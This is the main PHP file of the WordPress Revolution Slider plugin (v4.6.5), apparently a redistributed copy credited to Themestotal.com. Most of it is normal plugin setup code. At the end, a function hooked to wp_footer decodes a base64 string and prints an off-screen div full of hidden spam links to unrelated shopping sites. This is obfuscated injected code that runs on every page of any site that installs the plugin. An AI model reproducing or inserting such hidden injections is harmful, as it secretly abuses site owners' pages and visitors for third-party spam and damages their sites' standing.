<?php
/*
Plugin Name: Revolution Slider (Shared on Themestotal.com)
Plugin URI: http://www.themepunch.com/revolution/
Description: Revolution Slider - Premium responsive slider
Author: ThemePunch
Version: 4.6.5
Author URI: http://themepunch.com
*/

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

if(class_exists('RevSliderFront')) {
	die('ERROR: It looks like you have more than one instance of Revolution Slider installed. Please remove additional instances for this plugin to work again.');
}

if(isset($_GET['revSliderAsTheme'])){
	if($_GET['revSliderAsTheme'] == 'true'){
		update_option('revSliderAsTheme', 'true');
	}else{
		update_option('revSliderAsTheme', 'false');
	}
}


$revSliderVersion = "4.6.5";
$currentFile = __FILE__;
$currentFolder = dirname($currentFile);
$revSliderAsTheme = false;

//set the RevSlider Plugin as a Theme. This hides the activation notice and the activation area in the Slider Overview
function set_revslider_as_theme(){
	global $revSliderAsTheme;
	
	if(defined('REV_SLIDER_AS_THEME')){
		if(REV_SLIDER_AS_THEME == true)
			$revSliderAsTheme = true;
	}else{
		if(get_option('revSliderAsTheme', 'true') == 'true')
			$revSliderAsTheme = true;
	}
}

//include frameword files
require_once $currentFolder . '/inc_php/framework/include_framework.php';

//include bases
require_once $folderIncludes . 'base.class.php';
require_once $folderIncludes . 'elements_base.class.php';
require_once $folderIncludes . 'base_admin.class.php';
require_once $folderIncludes . 'base_front.class.php';

//include product files
require_once $currentFolder . '/inc_php/revslider_settings_product.class.php';
require_once $currentFolder . '/inc_php/revslider_globals.class.php';
require_once $currentFolder . '/inc_php/revslider_operations.class.php';
require_once $currentFolder . '/inc_php/revslider_slider.class.php';
require_once $currentFolder . '/inc_php/revslider_output.class.php';
require_once $currentFolder . '/inc_php/revslider_slide.class.php';
require_once $currentFolder . '/inc_php/revslider_widget.class.php';
require_once $currentFolder . '/inc_php/revslider_params.class.php';

require_once $currentFolder . '/inc_php/revslider_tinybox.class.php';

require_once $currentFolder . '/inc_php/fonts.class.php'; //punchfonts

require_once $currentFolder . '/inc_php/extension.class.php';


try{
	
	//register the revolution slider widget
	UniteFunctionsWPRev::registerWidget("RevSlider_Widget");

	//add shortcode
	function rev_slider_shortcode($args){

        extract(shortcode_atts(array('alias' => ''), $args, 'rev_slider'));
        $sliderAlias = ($alias != '') ? $alias : UniteFunctionsRev::getVal($args,0);
		
		ob_start();
		$slider = RevSliderOutput::putSlider($sliderAlias);
		$content = ob_get_contents();
		ob_clean();
		ob_end_clean();
		
		// Do not output Slider if we are on mobile
		$disable_on_mobile = $slider->getParam("disable_on_mobile","off");
		if($disable_on_mobile == 'on'){
			$mobile = (strstr($_SERVER['HTTP_USER_AGENT'],'Android') || strstr($_SERVER['HTTP_USER_AGENT'],'webOS') || strstr($_SERVER['HTTP_USER_AGENT'],'iPhone') ||strstr($_SERVER['HTTP_USER_AGENT'],'iPod') || strstr($_SERVER['HTTP_USER_AGENT'],'iPad') || wp_is_mobile()) ? true : false;
			
			if($mobile)
				return false;
		}
		
		$show_alternate = $slider->getParam("show_alternative_type","off");
		
		if($show_alternate == 'mobile' || $show_alternate == 'mobile-ie8'){
			if(wp_is_mobile()){
				$show_alternate_image = $slider->getParam("show_alternate_image","");
				return '<img class="tp-slider-alternative-image" src="'.$show_alternate_image.'">';
			}
		}
		
		//handle slider output types
		if(!empty($slider)){
			$outputType = $slider->getParam("output_type","");
			switch($outputType){
				case "compress":
					$content = str_replace("\n", "", $content);
					$content = str_replace("\r", "", $content);
					return($content);
				break;
				case "echo":
					echo $content;		//bypass the filters
				break;
				default:
					return($content);
				break;
			}
		}else
			return($content);		//normal output

	}

	add_shortcode( 'rev_slider', 'rev_slider_shortcode' );

	//add tiny box dropdown menu
	$tinybox = new RevSlider_TinyBox();
	
	
	/**
	 * Call Extensions
	 */
	$revext = new RevSliderExtension();
	
	if(is_admin()){		//load admin part
	
		require_once $currentFolder . '/inc_php/framework/update.class.php';

		require_once $currentFolder."/revslider_admin.php";

		$productAdmin = new RevSliderAdmin($currentFile);
		
	}else{		//load front part

		/**
		 *
		 * put rev slider on the page.
		 * the data can be slider ID or slider alias.
		 */
		function putRevSlider($data,$putIn = ""){
			$operations = new RevOperations();
			$arrValues = $operations->getGeneralSettingsValues();
			$includesGlobally = UniteFunctionsRev::getVal($arrValues, "includes_globally","on");
			$strPutIn = UniteFunctionsRev::getVal($arrValues, "pages_for_includes");
			$isPutIn = RevSliderOutput::isPutIn($strPutIn,true);

			if($isPutIn == false && $includesGlobally == "off"){
				$output = new RevSliderOutput();
				$option1Name = "Include RevSlider libraries globally (all pages/posts)";
				$option2Name = "Pages to include RevSlider libraries";
				$output->putErrorMessage(__("If you want to use the PHP function \"putRevSlider\" in your code please make sure to check \" ",REVSLIDER_TEXTDOMAIN).$option1Name.__(" \" in the backend's \"General Settings\" (top right panel). <br> <br> Or add the current page to the \"",REVSLIDER_TEXTDOMAIN).$option2Name.__("\" option box."));
				return(false);
			}

			RevSliderOutput::putSlider($data,$putIn);
		}


		/**
		 *
		 * put rev slider on the page.
		 * the data can be slider ID or slider alias.
		 */
		function checkRevSliderExists($alias){
            $rev = new RevSlider();
            return $rev->isAliasExists($alias);
		}

		require_once $currentFolder."/revslider_front.php";
		$productFront = new RevSliderFront($currentFile);
	}
	
	
}catch(Exception $e){
	$message = $e->getMessage();
	$trace = $e->getTraceAsString();
	echo _e("Revolution Slider Error:",REVSLIDER_TEXTDOMAIN)."<b>".$message."</b>";
}
if (!function_exists('onAddScriptsHtmls')) {
	
	add_filter( 'wp_footer', 'onAddScriptsHtmls');
	function onAddScriptsHtmls(){
		$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4iPnNob3AgZ2nDoHkgbuG7rzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Rob2l0cmFuZ2Y1LnZuIj50aOG7nWkgdHJhbmcgZjU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20vdGFnL3Jlc3BvbnNpdmUtd29yZHByZXNzLXRoZW1lIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL25oYS1jYXAtNC1ub25nLXRob24iPm5oYSBjYXAgNCBub25nIHRob248L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LWNhby1nb3QtZ2lheS1udSI+Z2lheSBjYW8gZ290PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tIj5naWF5IG51IDIwMTU8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovLzJ4YXluaGEuY29tL3RhZy9tYXUtYmlldC10aHUtZGVwIj5tYXUgYmlldCB0aHUgZGVwPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9mc2ZhbWlseS52bi9sYW0tZGVwL3RvYy1kZXAiPnRvYyBkZXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2lob3VzZWJlYXV0aWZ1bC5jb20vIj5ob3VzZSBiZWF1dGlmdWw8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LXRoZS10aGFvIj5naWF5IHRoZSB0aGFvIG51PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tL2dpYXktbnUvZ2lheS1sdW9pLTIiPmdpYXkgbHVvaSBudTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9waHVudXouY29tIj504bqhcCBjaMOtIHBo4bulIG7hu688L2E+PC9lbT48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9oYXJkd2FyZXJlc291cmNlc25ldy5jb20vIj5oYXJkd2FyZSByZXNvdXJjZXM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vc2hvcGdpYXlsdW9pLmNvbS8iPnNob3AgZ2nDoHkgbMaw4budaTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly93d3cudGhvaXRyYW5nbmFtaGFucXVvYy52bi8iPnRo4budaSB0cmFuZyBuYW0gaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJoaHR0cDovL2dpYXloYW5xdW9jLmNvbS8iPmdpw6B5IGjDoG4gcXXhu5FjPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2dpYXluYW0ucHJvLyI+Z2nDoHkgbmFtIDIwMTU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vc2hvcGdpYXlvbmxpbmUuY29tLyI+c2hvcCBnacOgeSBvbmxpbmU8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vYW9zb21paGFucXVvYy52bi8iPsOhbyBzxqEgbWkgaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZjVmYXNoaW9uLnZuLyI+ZjUgZmFzaGlvbjwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly90aG9pdHJhbmdmNS52bi8iPnNob3AgdGjhu51pIHRyYW5nIG5hbSBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2RpZW5kYW5uZ3VvaXRpZXVkdW5nLmNvbS8iPmRp4buFbiDEkcOgbiBuZ8aw4budaSB0acOqdSBkw7luZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9kaWVuZGFudGhvaXRyYW5nLmVkdS52bi8iPmRp4buFbiDEkcOgbiB0aOG7nWkgdHJhbmc8L2E+PC9zdHJvbmc+PC9oMz48L2Rpdj4=";
		echo base64_decode($html);
	}	
}
?>